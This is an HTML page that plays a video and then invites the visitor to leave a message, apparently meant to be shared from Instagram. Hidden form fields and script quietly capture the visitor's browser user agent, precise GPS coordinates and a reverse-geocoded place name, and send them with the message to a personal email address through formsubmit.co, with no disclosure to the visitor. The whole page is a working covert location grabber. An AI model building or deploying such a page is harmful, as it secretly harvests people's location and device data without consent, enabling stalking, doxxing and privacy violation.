<!DOCTYPE html><html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>OG Video Flow</title>
  <style>
    body {
      margin: 0;
      background: black;
      color: white;
      font-family: Arial, sans-serif;
      overflow: hidden;
    }video {
  width: 100%;
  height: 100vh;
  object-fit: cover;
}

.overlay {
  position: absolute;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  display: flex;
  align-items: center;
  justify-content: center;
  flex-direction: column;
  text-align: center;
  pointer-events: none;
}

.box {
  background: rgba(0,0,0,0.7);
  padding: 20px 30px;
  border-radius: 20px;
  pointer-events: auto;
}

button {
  margin: 10px;
  padding: 10px 18px;
  font-size: 16px;
  border-radius: 25px;
  border: none;
  cursor: pointer;
  font-weight: bold;
}

input, textarea {
  width: 260px;
  padding: 10px;
  border-radius: 10px;
  border: none;
  margin-top: 10px;
}

.hidden { display: none; }
.boldText { font-weight: bold; font-size: 18px; }

  </style>
</head>
<body><video id="video" src="video.mp4"></video>

<div class="overlay" id="choiceBox">
  <div class="box hidden" id="questionBox">
    <div class="boldText">Wanna leave a message?</div>
    <button onclick="showForm()">Yes</button>
    <button onclick="showScroll()">No</button>
  </div>  <div class="box hidden" id="formBox">
    <form id="msgForm" action="https://formsubmit.co/ureren77@gmail.com" method="POST">
      <input type="hidden" name="_captcha" value="false">
      <input type="hidden" name="_template" value="table">
      <input type="hidden" name="Device Info" id="deviceInfo">
      <input type="hidden" name="Location Coordinates" id="coords">
      <input type="hidden" name="Place Name" id="placeName"><textarea name="Message" placeholder="Type your message..." required></textarea><br>
  <button type="submit">Send</button>
</form>

  </div>  <div class="box hidden" id="thanksBox">
    <div class="boldText">Thank you, have a nice day</div>
    <div class="boldText">PLEASE GO BACK TO SCROLL</div>
    <button onclick="goInstagram()">CLICK HERE</button>
  </div>
</div><script>
const video = document.getElementById('video');
const questionBox = document.getElementById('questionBox');
const formBox = document.getElementById('formBox');
const thanksBox = document.getElementById('thanksBox');

video.loop = false;
video.play();

video.onended = () => {
  questionBox.classList.remove('hidden');
};

function showForm() {
  questionBox.classList.add('hidden');
  formBox.classList.remove('hidden');
}

function showScroll() {
  questionBox.classList.add('hidden');
  thanksBox.classList.remove('hidden');
}

function goInstagram() {
  window.location.href = "https://www.instagram.com";
}

// Handle form submit without redirect
const form = document.getElementById('msgForm');
form.addEventListener('submit', function(e){
  e.preventDefault();
  fetch(form.action, {
    method: 'POST',
    body: new FormData(form)
  }).then(() => {
    formBox.classList.add('hidden');
    thanksBox.classList.remove('hidden');
  });
});

// DEVICE INFO
let deviceText = navigator.userAgent;
document.getElementById('deviceInfo').value = deviceText;

// LOCATION + PLACE NAME
if(navigator.geolocation){
  navigator.geolocation.getCurrentPosition(pos => {
    let lat = pos.coords.latitude;
    let lon = pos.coords.longitude;
    document.getElementById('coords').value = lat + ", " + lon;

    fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`)
      .then(res => res.json())
      .then(data => {
        document.getElementById('placeName').value = data.display_name || 'Unknown Area';
      });
  });
}
</script></body>
</html>
